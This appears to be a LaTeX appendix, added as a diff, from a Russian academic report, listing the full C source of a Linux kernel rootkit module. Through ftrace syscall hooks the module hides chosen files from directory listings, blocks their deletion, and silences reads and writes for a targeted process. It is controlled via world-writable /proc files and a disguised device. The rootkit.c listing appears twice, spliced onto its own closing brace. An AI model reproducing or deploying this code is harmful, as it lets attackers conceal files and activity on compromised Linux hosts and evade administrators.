@@ -1,0 +1,893 @@
+\begin{appendices}
+	\chapter{}
+\end{appendices}
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Файл main.c}]
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/uaccess.h>
+#include <linux/fs.h>
+#include <linux/device.h>
+#include <linux/cdev.h>
+#include <linux/proc_fs.h>
+#include <linux/string.h>
+
+#include "rootkit.h"
+
+MODULE_DESCRIPTION("fs_module");
+MODULE_AUTHOR("Novikov Artem");
+MODULE_LICENSE("GPL");
+
+#define PROC_FILE_NAME_HIDDEN "hidden"
+#define PROC_FILE_NAME_PROTECTED "protected"
+
+static char buffer[MAX_BUF_SIZE];
+char tmp_buffer[MAX_BUF_SIZE];
+char hidden_files[100][100];
+int hidden_index = 0;
+char protected_files[100][100];
+int protected_index = 0;
+
+static ssize_t my_proc_write(struct file *file, const char __user *buf, size_t len, loff_t *ppos)
+{
+	DBG("my_proc_write called");
+	
+	if (len > MAX_BUF_SIZE - write_index + 1)
+	{
+		DBG("buffer overflow");
+		return -ENOMEM;
+	}
+	
+	if (copy_from_user(&buffer[write_index], buf, len) != 0)
+	{
+		DBG("copy_from_user fail");
+		return -EFAULT;
+	}
+	
+	write_index += len;
+	buffer[write_index - 1] = '\0';
+	
+	if (strcmp(file->f_path.dentry->d_name.name, PROC_FILE_NAME_HIDDEN) == 0)
+	{
+		snprintf(hidden_files[hidden_index], len, "%s", &buffer[write_index - len]);
+		hidden_index++;
+		DBG("file written to hidden %s", hidden_files[hidden_index - 1]);
+	}
+	else if (strcmp(file->f_path.dentry->d_name.name, PROC_FILE_NAME_PROTECTED) == 0)
+	{
+		snprintf(protected_files[protected_index], len, "%s", &buffer[write_index - len]);
+		protected_index++;
+		DBG("file written to protected %s", protected_files[protected_index - 1]);
+	}
+	else
+	{
+		DBG("Unknown file->f_path.dentry->d_name.name");
+	}
+	return len;
+}
+
+static ssize_t my_proc_read(struct file *file, char __user *buf, size_t len, loff_t *f_pos)
+{
+	DBG("my_proc_read called");
+	
+	if (*f_pos > 0 || write_index == 0)
+	return 0;
+	
+	if (read_index >= write_index)
+	read_index = 0;
+	
+	int read_len = snprintf(tmp_buffer, MAX_BUF_SIZE, "%s\n", &buffer[read_index]);
+	
+	if (copy_to_user(buf, tmp_buffer, read_len) != 0)
+	{
+		DBG("copy_to_user error.\n");
+		return -EFAULT;
+	}
+	
+	read_index += read_len;
+	*f_pos += read_len;
+	
+	return read_len;
+}
+
+static const struct proc_ops fops = {
+	.proc_read = my_proc_read,
+	.proc_write = my_proc_write,
+};
+
+static int __init fh_init(void)
+{
+	struct device *fake_device;
+	int error = 0;
+	dev_t dev = 0;
+	
+	proc_file_hidden = proc_create(PROC_FILE_NAME_HIDDEN, S_IRUGO | S_IWUGO, NULL, &fops);
+	if (!proc_file_hidden)
+	{
+		DBG("call proc_create() fail");
+		return -ENOMEM;
+	}
+	
+	proc_file_protected = proc_create(PROC_FILE_NAME_PROTECTED, S_IRUGO | S_IWUGO, NULL, &fops);
+	if (!proc_file_protected)
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		DBG("call proc_create() fail");
+		return -ENOMEM;
+	}
+	DBG("proc file created");
+	
+	error = init_kallsyms();
+	if (error) {
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		DBG("Failed to init kallsyms: %d", error);
+		return error;
+	}
+	
+	error = start_hook_resources();
+	if (error)
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		DBG("return in hook functions");
+		return error;
+	}
+	
+	error = alloc_chrdev_region(&dev, 0, 1, "table");
+	if (error < 0)
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		return error;
+	}
+	
+	major = MAJOR(dev);
+	minor = MINOR(dev);
+	
+	fake_class = class_create("custom_char_class");
+	if (IS_ERR(fake_class)) {
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		unregister_chrdev_region(dev, 1);
+		return PTR_ERR(fake_class);
+	}
+	
+	cdev_init(&fake_cdev, &fake_fops);
+	fake_cdev.owner = THIS_MODULE;
+	cdev_add(&fake_cdev, dev, 1);
+	
+	fake_device = device_create(fake_class,
+	NULL,
+	dev,
+	NULL,
+	"emblem");
+	
+	if (IS_ERR(fake_device))
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		class_destroy(fake_class);
+		unregister_chrdev_region(dev, 1);
+		return -1;
+	}
+	
+	return 0;
+}
+
+static void __exit fh_exit(void)
+{
+	if (proc_file_hidden)
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		DBG("proc file removed (hidden)");
+	}
+	
+	if (proc_file_protected)
+	{
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		DBG("proc file removed (protected)");
+	}
+	
+	fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
+	unregister_chrdev_region(MKDEV(major, 0), 1);
+	device_destroy(fake_class, MKDEV(major, 0));
+	cdev_del(&fake_cdev);
+	class_destroy(fake_class);
+}
+
+module_init(fh_init);
+module_exit(fh_exit);
+\end{lstlisting}
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Файл rootkit.h}]
+#ifndef ROOTKIT_H
+#define ROOTKIT_H
+
+#include <linux/ftrace.h>
+#include <linux/kallsyms.h>
+#include <linux/syscalls.h>
+#include <linux/kernel.h>
+#include <linux/version.h>
+#include <linux/delay.h>
+#include <linux/kthread.h>
+#include <asm/ptrace.h>
+#include <linux/fcntl.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
+#include <linux/device.h>
+#include <linux/cdev.h>
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/proc_fs.h>
+#include <linux/kprobes.h>
+#include <linux/string.h>
+
+#define FILE_NAME (strrchr(__FILE__, '/') ? strrchr(__FILE__, '/') + 1 : __FILE__)
+
+#define DBG(fmt, ...) \
+printk(KERN_INFO "DBG: %s(%d): " fmt "\n", FILE_NAME, __LINE__, ##__VA_ARGS__)
+
+#define MAX_BUF_SIZE 1000
+
+static struct proc_dir_entry *proc_file_hidden;
+static struct proc_dir_entry *proc_file_protected;
+
+extern char hidden_files[100][100];
+extern int hidden_index;
+extern char protected_files[100][100];
+extern int protected_index;
+
+static int read_index = 0;
+static int write_index = 0;
+static unsigned int major;
+static unsigned int minor;
+static struct class *fake_class;
+static struct cdev fake_cdev;
+static short fs_hidden = 1;
+static short fs_protect = 1;
+
+ssize_t fake_write(struct file *file, const char __user *buf, size_t count, loff_t *offset);
+
+static struct file_operations fake_fops = {
+	.write = fake_write,
+};
+
+int check_fs_blocklist(char *input);
+int check_fs_hidelist(char *input);
+
+static unsigned int target_fd = 0;
+static unsigned int target_pid = 0;
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+extern kallsyms_lookup_name_t kallsyms_lookup_name_ptr;
+
+int init_kallsyms(void);
+
+static unsigned long lookup_name(const char *name)
+{
+	if (!kallsyms_lookup_name_ptr) {
+		DBG("kallsyms_lookup_name_ptr not initialized");
+		return 0;
+	}
+	return kallsyms_lookup_name_ptr(name);
+}
+
+struct ftrace_hook {
+	const char *name;
+	void *function;
+	void *original;
+	
+	unsigned long address;
+	struct ftrace_ops ops;
+};
+
+#ifndef MCOUNT_INSN_SIZE
+#define MCOUNT_INSN_SIZE 5
+#endif
+
+static int fh_resolve_hook_address(struct ftrace_hook *hook)
+{
+	hook->address = lookup_name(hook->name);
+	
+	if (!hook->address) {
+		DBG("unresolved symbol: %s, trying alternatives\n", hook->name);
+		// Попробуем альтернативные имена
+		char alt_name[128];
+		// Попробуем __do_sys_* вместо __x64_sys_*
+		if (strncmp(hook->name, "__x64_sys_", 10) == 0) {
+			snprintf(alt_name, sizeof(alt_name), "__do_sys_%s", hook->name + 10);
+			hook->address = lookup_name(alt_name);
+		}
+		// Попробуем sys_* без префикса
+		if (!hook->address && strncmp(hook->name, "__x64_sys_", 10) == 0) {
+			snprintf(alt_name, sizeof(alt_name), "sys_%s", hook->name + 10);
+			hook->address = lookup_name(alt_name);
+		}
+		if (!hook->address) {
+			DBG("unresolved symbol: %s (all alternatives failed)\n", hook->name);
+			return -ENOENT;
+		}
+		DBG("resolved via alternative: %s -> %lx\n", hook->name, hook->address);
+	}
+	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+	
+	return 0;
+}
+
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
+struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+	struct pt_regs *regs;
+	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+	
+	regs = ftrace_get_regs(fregs);
+	if (!regs)
+	return;
+	
+	regs->ip = (unsigned long)hook->function;
+}
+
+int fh_install_hook(struct ftrace_hook *hook);
+void fh_remove_hook(struct ftrace_hook *hook);
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
+
+static char *get_filename(const char __user *filename)
+{
+	char *kernel_filename = NULL;
+	kernel_filename = kmalloc(4096, GFP_KERNEL);
+	if (!kernel_filename)
+	return NULL;
+	
+	if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
+		kfree(kernel_filename);
+		return NULL;
+	}
+	return kernel_filename;
+}
+
+static asmlinkage long (*real_sys_write)(struct pt_regs *regs);
+static asmlinkage long fh_sys_write(struct pt_regs *regs)
+{
+	long ret = 0;
+	struct task_struct *task;
+	task = current;
+	
+	if (task->pid == target_pid && regs->di == target_fd)
+	{
+		return 0;
+	}
+	
+	ret = real_sys_write(regs);
+	return ret;
+}
+
+static asmlinkage long (*real_sys_read)(struct pt_regs *regs);
+static asmlinkage long fh_sys_read(struct pt_regs *regs)
+{
+	long ret = 0;
+	struct task_struct *task = current;
+	
+	if (task->pid == target_pid && regs->di == target_fd)
+	{
+		return 0;
+	}
+	
+	ret = real_sys_read(regs);
+	return ret;
+}
+
+static asmlinkage long (*real_sys_open)(struct pt_regs *regs);
+static asmlinkage long fh_sys_open(struct pt_regs *regs)
+{
+	long ret;
+	char *kernel_filename;
+	struct task_struct *task;
+	task = current;
+	kernel_filename = get_filename((void*) regs->di);
+	
+	if (!kernel_filename)
+	{
+		return real_sys_open(regs);
+	}
+	
+	if (check_fs_blocklist(kernel_filename))
+	{
+		DBG("our file is opened by process with id: %d", task->pid);
+		DBG("opened file : '%s'", kernel_filename);
+		kfree(kernel_filename);
+		ret = real_sys_open(regs);
+		DBG("fd returned is %ld", ret);
+		if (ret >= 0)
+		{
+			target_fd = ret;
+			target_pid = task->pid;
+		}
+		return ret;
+	}
+	
+	kfree(kernel_filename);
+	ret = real_sys_open(regs);
+	
+	return ret;
+}
+
+static asmlinkage long (*real_sys_unlink)(struct pt_regs *regs);
+static asmlinkage long fh_sys_unlink(struct pt_regs *regs)
+{
+	long ret = 0;
+	char *kernel_filename = get_filename((void*) regs->di);
+	
+	if (!kernel_filename)
+	{
+		return real_sys_unlink(regs);
+	}
+	
+	if (check_fs_blocklist(kernel_filename))
+	{
+		ret = 0;
+		kfree(kernel_filename);
+		return ret;
+	}
+	
+	kfree(kernel_filename);
+	ret = real_sys_unlink(regs);
+	
+	return ret;
+}
+
+static asmlinkage long (*real_sys_getdents64)(const struct pt_regs *);
+static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
+{
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+	struct linux_dirent64 *previous_dir = NULL, *current_dir, *dirent_ker = NULL;
+	unsigned long offset = 0;
+	int ret = real_sys_getdents64(regs);
+	
+	if (ret <= 0)
+	{
+		return ret;
+	}
+	
+	dirent_ker = kmalloc(ret, GFP_KERNEL);
+	
+	if (dirent_ker == NULL)
+	{
+		return ret;
+	}
+	
+	if (copy_from_user(dirent_ker, dirent, ret) != 0)
+	{
+		kfree(dirent_ker);
+		return ret;
+	}
+	
+	while (offset < ret)
+	{
+		current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
+		
+		if (check_fs_hidelist(current_dir->d_name))
+		{
+			if (current_dir == dirent_ker)
+			{
+				ret -= current_dir->d_reclen;
+				memmove(current_dir, (void *)current_dir + 
+				current_dir->d_reclen, ret);
+				continue;
+			}
+			if (previous_dir)
+			{
+				previous_dir->d_reclen += current_dir->d_reclen;
+			}
+		}
+		else
+		{
+			previous_dir = current_dir;
+		}
+		offset += current_dir->d_reclen;
+	}
+	if (copy_to_user(dirent, dirent_ker, ret) != 0)
+	{
+		kfree(dirent_ker);
+		return ret;
+	}
+	kfree(dirent_ker);
+	return ret;
+}
+
+#define SYSCALL_NAME(name) ("__x64_sys_" name)
+
+#define HOOK(_name, _function, _original) \
+{ \
+	.name = SYSCALL_NAME(_name), \
+	.function = (_function), \
+	.original = (_original), \
+}
+
+static struct ftrace_hook demo_hooks[] = {
+	HOOK("write", fh_sys_write, &real_sys_write),
+	HOOK("read", fh_sys_read, &real_sys_read),
+	HOOK("open", fh_sys_open, &real_sys_open),
+	HOOK("unlink", fh_sys_unlink, &real_sys_unlink),
+	HOOK("getdents64", fh_sys_getdents64, &real_sys_getdents64)
+};
+
+static int start_hook_resources(void)
+{
+	int err;
+	err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
+	if (err)
+	{
+		return err;
+	}
+	return 0;
+}
+
+#endif
+\end{lstlisting}
+
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Файл rootkit.c}]
+#include "rootkit.h"
+
+kallsyms_lookup_name_t kallsyms_lookup_name_ptr = NULL;
+
+int init_kallsyms(void)
+{
+struct kprobe kp = {
+.symbol_name = "kallsyms_lookup_name"
+};
+int ret;
+unsigned long addr;
+
+ret = register_kprobe(&kp);
+if (ret < 0) {
+DBG("register_kprobe failed for kallsyms_lookup_name: %d", ret);
+return ret;
+}
+
+addr = (unsigned long)kp.addr;
+unregister_kprobe(&kp);
+
+if (!addr) {
+DBG("Failed to resolve kallsyms_lookup_name address");
+return -ENOENT;
+}
+
+kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)addr;
+DBG("kallsyms_lookup_name resolved at %lx", addr);
+DBG("kallsyms_lookup_name_ptr set to %px", (void *)kallsyms_lookup_name_ptr);
+return 0;
+}
+
+ssize_t fake_write(struct file *flip, const char __user *buf, size_t count, loff_t *offset)
+{
+char message[128];
+memset(message, 0, 127);
+
+if (copy_from_user(message, buf, 127) != 0)
+{
+return -EFAULT;
+}
+
+if (strstr(message, "1234") != NULL)
+{
+fs_hidden = fs_hidden ? 0 : 1;
+}
+
+if (strstr(message, "4321") != NULL)
+{
+fs_protect = fs_protect ? 0 : 1;
+}
+
+return count;
+}
+
+int check_fs_blocklist(char *input)
+{
+int i = 0;
+
+if (fs_protect == 0)
+{
+return 0;
+}
+
+if (strlen(protected_files[0]) <= 2)
+{
+return 0;
+}
+
+while (i != protected_index)
+{
+if (strstr(input, protected_files[i]) != NULL)
+return 1;
+i++;
+}
+
+return 0;
+}
+
+int check_fs_hidelist(char *input)
+{
+int i = 0;
+
+if (fs_hidden == 0)
+{
+return 0;
+}
+
+if (strlen(hidden_files[0]) <= 2)
+{
+return 0;
+}
+
+while (i != hidden_index)
+{
+if (strstr(input, hidden_files[i]) != NULL)
+return 1;
+i++;
+}
+
+return 0;
+}
+
+int fh_install_hook(struct ftrace_hook *hook)
+{
+int error;
+
+error = fh_resolve_hook_address(hook);
+if (error)
+{
+return error;
+}
+
+hook->ops.func = fh_ftrace_thunk;
+hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS |
+FTRACE_OPS_FL_IPMODIFY |
+FTRACE_OPS_FL_RECURSION;
+
+error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+if (error)
+{
+DBG("ftrace_set_filter_ip() failed: %d\n", error);
+return error;
+}
+
+error = register_ftrace_function(&hook->ops);
+if (error)
+{
+DBG("register_ftrace_function() failed: %d\n", error);
+ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+return error;
+}
+return 0;
+}
+
+void fh_remove_hook(struct ftrace_hook *hook)
+{
+int err;
+
+err = unregister_ftrace_function(&hook->ops);
+if (err)
+{
+DBG("unregister_ftrace_function() failed: %d\n", err);
+}
+
+err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+if (err)
+{
+DBG("ftrace_set_filter_ip() failed: %d\n", err);
+}
+}
+
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
+{
+int err;
+size_t i;
+
+for (i = 0; i < count; i++) {
+err = fh_install_hook(&hooks[i]);
+if (err)
+{
+while (i != 0)
+{
+fh_remove_hook(&hooks[--i]);
+}
+return err;
+}
+}
+return 0;
+}
+
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
+{
+size_t i;
+
+for (i = 0; i < count; i++)
+{
+fh_remove_hook(&hooks[i]);
+}
+}#include "rootkit.h"
+
+kallsyms_lookup_name_t kallsyms_lookup_name_ptr = NULL;
+
+int init_kallsyms(void)
+{
+	struct kprobe kp = {
+		.symbol_name = "kallsyms_lookup_name"
+	};
+	int ret;
+	unsigned long addr;
+	
+	ret = register_kprobe(&kp);
+	if (ret < 0) {
+		DBG("register_kprobe failed for kallsyms_lookup_name: %d", ret);
+		return ret;
+	}
+	
+	addr = (unsigned long)kp.addr;
+	unregister_kprobe(&kp);
+	
+	if (!addr) {
+		DBG("Failed to resolve kallsyms_lookup_name address");
+		return -ENOENT;
+	}
+	
+	kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)addr;
+	DBG("kallsyms_lookup_name resolved at %lx", addr);
+	DBG("kallsyms_lookup_name_ptr set to %px", (void *)kallsyms_lookup_name_ptr);
+	return 0;
+}
+
+ssize_t fake_write(struct file *flip, const char __user *buf, size_t count, loff_t *offset)
+{
+	char message[128];
+	memset(message, 0, 127);
+	
+	if (copy_from_user(message, buf, 127) != 0)
+	{
+		return -EFAULT;
+	}
+	
+	if (strstr(message, "1234") != NULL)
+	{
+		fs_hidden = fs_hidden ? 0 : 1;
+	}
+	
+	if (strstr(message, "4321") != NULL)
+	{
+		fs_protect = fs_protect ? 0 : 1;
+	}
+	
+	return count;
+}
+
+int check_fs_blocklist(char *input)
+{
+	int i = 0;
+	
+	if (fs_protect == 0)
+	{
+		return 0;
+	}
+	
+	if (strlen(protected_files[0]) <= 2)
+	{
+		return 0;
+	}
+	
+	while (i != protected_index)
+	{
+		if (strstr(input, protected_files[i]) != NULL)
+		return 1;
+		i++;
+	}
+	
+	return 0;
+}
+
+int check_fs_hidelist(char *input)
+{
+	int i = 0;
+	
+	if (fs_hidden == 0)
+	{
+		return 0;
+	}
+	
+	if (strlen(hidden_files[0]) <= 2)
+	{
+		return 0;
+	}
+	
+	while (i != hidden_index)
+	{
+		if (strstr(input, hidden_files[i]) != NULL)
+		return 1;
+		i++;
+	}
+	
+	return 0;
+}
+
+int fh_install_hook(struct ftrace_hook *hook)
+{
+	int error;
+	
+	error = fh_resolve_hook_address(hook);
+	if (error)
+	{
+		return error;
+	}
+	
+	hook->ops.func = fh_ftrace_thunk;
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS |
+	FTRACE_OPS_FL_IPMODIFY |
+	FTRACE_OPS_FL_RECURSION;
+	
+	error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+	if (error)
+	{
+		DBG("ftrace_set_filter_ip() failed: %d\n", error);
+		return error;
+	}
+	
+	error = register_ftrace_function(&hook->ops);
+	if (error)
+	{
+		DBG("register_ftrace_function() failed: %d\n", error);
+		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+		return error;
+	}
+	return 0;
+}
+
+void fh_remove_hook(struct ftrace_hook *hook)
+{
+	int err;
+	
+	err = unregister_ftrace_function(&hook->ops);
+	if (err)
+	{
+		DBG("unregister_ftrace_function() failed: %d\n", err);
+	}
+	
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+	if (err)
+	{
+		DBG("ftrace_set_filter_ip() failed: %d\n", err);
+	}
+}
+
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
+{
+	int err;
+	size_t i;
+	
+	for (i = 0; i < count; i++) {
+		err = fh_install_hook(&hooks[i]);
+		if (err)
+		{
+			while (i != 0)
+			{
+				fh_remove_hook(&hooks[--i]);
+			}
+			return err;
+		}
+	}
+	return 0;
+}
+
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
+{
+	size_t i;
+	
+	for (i = 0; i < count; i++)
+	{
+		fh_remove_hook(&hooks[i]);
+	}
+}
+\end{lstlisting}
